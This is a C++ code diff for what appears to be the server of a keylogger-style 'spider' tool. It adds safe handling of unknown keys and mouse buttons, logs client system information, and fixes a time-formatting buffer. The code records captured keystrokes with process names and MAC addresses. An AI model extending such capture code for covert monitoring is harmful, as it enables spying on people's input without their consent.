@@ -1,6 +1,7 @@
 #include "EventStorage.h"
 #include "Logger.hpp"
 #include "Keys.h"
+#include "SystemInfo.h"
 #include <cstring>
 #include <map>
 #include <chrono>
@@ -185,6 +186,24 @@ namespace spider
            {client::library::KeyboardKey::KB_LCMD, "<left command>"},
            {client::library::KeyboardKey::KB_RCMD, "<right command>"},
            {client::library::KeyboardKey::KB_NONE, "<unknown>"}};
+      static std::map<client::library::OperatingSystem, std::string> const
+          osMap = {
+              {spider::client::library::OperatingSystem::Windows, "Windows"},
+              {spider::client::library::OperatingSystem::MacOS, "MacOS"},
+              {spider::client::library::OperatingSystem::Linux, "Linux"},
+              {spider::client::library::OperatingSystem::Other, "Other"}};
+      static std::map<client::library::Architecture, std::string> const
+          architectureMap = {
+              {client::library::Architecture::BITS_64, "64 bits"},
+              {client::library::Architecture::BITS_32, "32 bits"},
+              {client::library::Architecture::BITS_UNKNOWN, "Unknown bits"}};
+      static std::map<client::library::ProcArchitecture,
+                      std::string> const procArchitectureMap = {
+          {client::library::ProcArchitecture::AMD64, "AMD64"},
+          {client::library::ProcArchitecture::ARM, "ARM"},
+          {client::library::ProcArchitecture::IntelItanium, "Intel Itanium"},
+          {client::library::ProcArchitecture::x86, "x86"},
+          {client::library::ProcArchitecture::Unknown, "Unknown"}};
 
       while (!m_storage.empty())
 	{
@@ -200,19 +219,44 @@ namespace spider
 	        store.header.macAddress[4], store.header.macAddress[5]);
 	    msg = tmp.data();
 	  }
-	  msg += " - " +
-	         timeToString(static_cast<std::time_t>(store.header.time)) +
-	         " - " + typeMap.at(store.header.type) + " - ";
+
+	  {
+
+	    std::string type;
+	    if (typeMap.find(store.header.type) == typeMap.end())
+	      {
+		type = "Unknown";
+		nope::log::Log(Info) << "Unknown type event";
+	      }
+	    else
+	      {
+		type = typeMap.at(store.header.type);
+	      }
+
+	    msg += " - " +
+	           timeToString(static_cast<std::time_t>(store.header.time)) +
+	           " - " + type + " - ";
+	  }
 
 	  switch (store.header.type)
 	    {
 	    case network::tcp::PacketType::KeyboardEvent:
 	      {
-		std::string key = keyMap.at(
-		    static_cast<client::library::KeyboardKey>(store.ev.key));
+		std::string key;
+		if (keyMap.find(static_cast<client::library::KeyboardKey>(
+		        store.ev.key)) == keyMap.end())
+		  {
+		    key = "<unknown>";
+		  }
+		else
+		  {
+		    key = keyMap.at(static_cast<client::library::KeyboardKey>(
+		        store.ev.key));
+		  }
+
 		if (store.ev.shift)
 		  {
-		    // Handle if shift is pressed
+		    // TODO: Handle if shift is pressed
 		  }
 
 		msg += key + " - " + stateMap.at(store.ev.state) + " [" +
@@ -222,12 +266,25 @@ namespace spider
 	      }
 	      break;
 	    case network::tcp::PacketType::MouseButton:
-	      msg +=
-	          mouseButtonMap.at(static_cast<client::library::MouseButton>(
-	              store.ev.key)) +
-	          " - " + stateMap.at(store.ev.state) + " [" +
-	          reinterpret_cast<char const *>(store.ev.processName.data()) +
-	          "]";
+	      {
+		std::string mouseKey;
+		if (mouseButtonMap.find(
+		        static_cast<client::library::MouseButton>(
+		            store.ev.key)) == mouseButtonMap.end())
+		  {
+		    mouseKey = "<unknown>";
+		  }
+		else
+		  {
+		    mouseKey = mouseButtonMap.at(
+		        static_cast<client::library::MouseButton>(
+		            store.ev.key));
+		  }
+		msg += mouseKey + " - " + stateMap.at(store.ev.state) + " [" +
+		       reinterpret_cast<char const *>(
+		           store.ev.processName.data()) +
+		       "]";
+	      }
 	      break;
 	    case network::tcp::PacketType::MousePosition:
 	      msg += std::to_string(store.mov.posX) + " - " +
@@ -239,6 +296,23 @@ namespace spider
 	    case network::tcp::PacketType::Screenshot:
 	      break;
 	    case network::tcp::PacketType::Infos:
+	      {
+		msg +=
+		    procArchitectureMap.at(
+		        static_cast<spider::client::library::ProcArchitecture>(
+		            store.infos.procArch)) +
+		    " - " +
+		    architectureMap.at(
+		        static_cast<spider::client::library::Architecture>(
+		            store.infos.arch)) +
+		    " - " +
+		    osMap.at(
+		        static_cast<spider::client::library::OperatingSystem>(
+		            store.infos.os)) +
+		    " - " + std::to_string(store.infos.pageSize) + " Kb - " +
+		    std::to_string(store.infos.nbProc) + " CPUs - " +
+		    std::to_string(store.infos.ram) + " Mb";
+	      }
 	      break;
 	    }
 
@@ -250,10 +324,13 @@ namespace spider
     std::string Storage::timeToString(std::time_t const rawtime) const
     {
       struct tm *dt;
-      std::array<char, 30> buffer{};
+      std::array<char, 64> buffer{};
 
       dt = std::localtime(&rawtime);
-      std::strftime(buffer.data(), sizeof(buffer), "%c", dt);
+      if (dt)
+	{
+	  std::strftime(buffer.data(), sizeof(buffer), "%c", dt);
+	}
       return std::string(buffer.data());
     }
   }
